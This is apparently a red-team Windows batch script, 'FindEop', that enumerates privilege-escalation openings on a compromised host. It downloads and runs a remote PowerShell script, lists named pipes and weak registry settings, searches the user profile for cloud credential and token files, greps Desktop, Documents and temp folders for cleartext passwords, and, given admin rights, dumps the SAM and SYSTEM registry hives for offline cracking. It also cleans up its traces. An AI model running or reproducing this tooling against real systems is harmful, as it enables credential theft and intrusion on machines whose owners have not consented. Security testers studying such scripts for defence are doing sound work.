@echo off
TITLE FindEop v1.3.24 {SSA RedTeam @2022}

:: Local variables
SET LocalPath=%cd%
SET BatVersion=v1.3.24
...
IF NOT %1%.==. (
   ...
   echo ANTI-VIRUS DEFINITIONS
   echo ----------------------
   powershell -C "iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Get-AVStatus.ps1' -OutFile $Env:TMP\Get-AVStatus.ps1|Unblock-File;powershell -File $Env:TMP\Get-AVStatus.ps1;Remove-Item -Path $Env:TMP\Get-AVStatus.ps1 -Force"
   echo.
   echo.
)
...
IF %1%.==. (
   powershell -C "Write-Host '[i] First 5 pipes found.' -ForeGroundColor Yellow"
   echo ------------------------
   ...
   powershell -C "Write-Host '[i] First 10 pipes found.' -ForeGroundColor Yellow"
   echo -------------------------
   powershell -C "$CheckPipes = (Get-ChildItem \\.\pipe\ -EA SilentlyContinue).FullName;If($CheckPipes){Write-Host '[VULNERABLE::T1574]' -ForeGroundColor Green -BackGroundColor Black;$Report = $CheckPipes|Select -Skip 1|Select -First 10;echo $Report}Else{Write-Host 'ERROR: None Name Pipes found ..'}"
)
echo.
echo.
...
IF %1%.==. (
   ...
   powershell -File %tmp%\ACLMitreT1574.ps1 -action reg -extraGroup true -Egg true
)
...
echo ----------------------
powershell -C "try{$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -EA SilentlyContinue;If($TESTREGISTRY -Match '0'){Write-Host [RDP] Connections: Allowed fDenyTSConnections REG_DWORD 0X$TESTREGISTRY -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[RDP] Connections: NotAllowed REG_DWORD 0x1.'}}catch{Write-Host '[RDP] Connections: NotAllowed REG_DWORD 0x1.'}"
echo.
echo.
...
IF NOT %1%.==. (
   ...
   echo CLOUD CREDENTIALS in %USERPROFILE%
   echo -----------------------------------
   powershell -C "$TESTFILES = (Get-ChildItem -Path $Env:USERPROFILE -Recurse -Include 'credentials.db','access_tokens.db','accessTokens.json','azureProfile.json','legacy_credentials','gcloud' -Exclude 'Saved Games','Starcraft II','Music','Searches','Favorites','Videos','Battle.net','old_Cache_000','CacheStorage','GPUCache' -Force -EA SilentlyContinue).FullName;If($TESTFILES){Write-Host $TESTFILES -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[CLOUD] not found: credentials in db files.' -ForeGroundColor Red -BackGroundColor Black}"
   echo.
   echo.
)
...
echo INJECT 'fake' UPDATES INTO NON-SSL WSUS TRAFFIC
echo ------------------------------------------------
...
echo -----------------------------------------
powershell -C "try{$TESTREGISTRY = Get-ItemPropertyValue -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -EA SilentlyContinue;If($TESTREGISTRY -Match '1'){Write-Host [VULNERABLE::T1012] UseLogonCredential REG_DWORD 0X$TESTREGISTRY -ForeGroundColor Green -BackGroundColor Black}Else{Write-Host '[WDIGEST] none vulnerable settings found.'}}catch{Write-Host '[WDIGEST] none vulnerable settings found.'}"
echo.
echo.
...
IF %ERRORLEVEL% EQU 0 (
   ...
   cd %userprofile%\Desktop && findstr /s /I /C:"Username" /s /I /C:"User:" /s /I /C:"user name" /s /I /C:"pass" /s /I /C:"Password" /s /I /C:"passwd" *.txt *.log *.xml > %tmp%\cleartext.txt

   IF EXIST %tmp%\cleartext.txt (
      powershell -C "Get-Content $Env:TMP\cleartext.txt -Encoding UTF8|Out-String -Stream|ForEach-Object {$stringformat = If($_ -iMatch '(Username|User|user name|pass|Password|passwd)'){@{ 'ForegroundColor' = 'Green' }}Else{@{ 'ForegroundColor' = 'White' }}Write-Host @stringformat $_}"
   )

) ELSE (

   dir %OneDrive%\Desktop >nul 2>&1
   IF %ERRORLEVEL% EQU 0 (
      echo [DIRECTORY] Scanning : '%OneDrive%\Desktop'
      cd %OneDrive%\Desktop && findstr /s /I /C:"Username" /s /I /C:"User:" /s /I /C:"user name" /s /I /C:"pass" /s /I /C:"Password" /s /I /C:"passwd" *.txt *.log *.xml > %tmp%\cleartext.txt
      ...
      powershell -C "Write-Host [DIRECTORY] NotFound : `'$Env:USERPROFILE\Desktop`' -ForeGroundColor Red" 
      powershell -C "Write-Host [DIRECTORY] NotFound : `'$Env:ONEDRIVE\Desktop`' -ForeGroundColor Red"   
   )
)
...
IF %ERRORLEVEL% EQU 0 (
   ...
   cd %userprofile%\Documents && findstr /s /I /C:"Username" /s /I /C:"User:" /s /I /C:"user name" /s /I /C:"pass" /s /I /C:"Password" /s /I /C:"passwd" *.txt *.log *.xml >> %tmp%\cleartext.txt
   ...
   powershell -C "Write-Host [DIRECTORY] NotFound : `'$Env:USERPROFILE\Documents`' -ForeGroundColor Red"
)

dir %tmp% >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
   echo [DIRECTORY] Scanning : '%tmp%'
   cd %tmp% && findstr /s /I /C:"Username" /s /I /C:"User:" /s /I /C:"user name" /s /I /C:"pass" /s /I /C:"Password" /s /I /C:"passwd" *.txt *.log *.xml > %tmp%\cleartext.txt
   ...
   powershell -C "Write-Host [DIRECTORY] NotFound : `'$Env:TMP`' -ForeGroundColor Red"
)

:: Clean artifacts left behind
del /f %tmp%\cleartext.txt >nul 2>&1
:: return to pwd
cd %LocalPath%
echo.
echo.
...
:: Dump SAM \ SYSTEM
echo DUMP SAM\SYSTEM REGISTRY FILES
powershell -C "Write-Host '[i] Use secretsdump.py from Impacket to decrypt ..' -ForeGroundColor Yellow"
echo --------------------------------------------------
del /f C:\Users\pedro\AppData\Local\Temp\sam.save >nul 2>&1
del /f C:\Users\pedro\AppData\Local\Temp\system.save >nul 2>&1
:: https://cyberint.com/blog/research/hivenightmare-serioussam-cve-2021-36934
powershell -C "$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match 'S-1-5-32-544');If(-not($bool)){Write-Host '[DUMP] Administrator privileges required to dump.' -ForeGroundColor Red -BackGroundColor Black}Else{Write-Host '[DUMP] %tmp%\sam.save';reg.exe save hklm\sam %temp%\sam.save|Out-Null;Write-Host '[DUMP] %tmp%\system.save';reg.exe save hklm\system %temp%\system.save|Out-Null;If(-not(Test-Path -Path $Env:TMP\sam.save -EA SilentlyContinue)){Write-Host '[FAIL] To write dump to %tmp%' -ForeGroundColor Red -BackGroundColor Black}}"
